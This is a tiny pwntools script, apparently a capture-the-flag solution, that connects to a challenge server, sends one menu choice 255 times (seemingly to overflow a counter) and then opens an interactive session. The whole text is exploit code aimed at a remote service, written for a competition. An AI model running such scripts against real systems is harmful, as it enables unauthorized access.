from pwn import *
p = remote("pwn.chal.ctf.gdgalgiers.com", 1402)
for i in range(255):
    p.sendlineafter("Choice: ", "1")
p.sendline("3")
p.interactive()
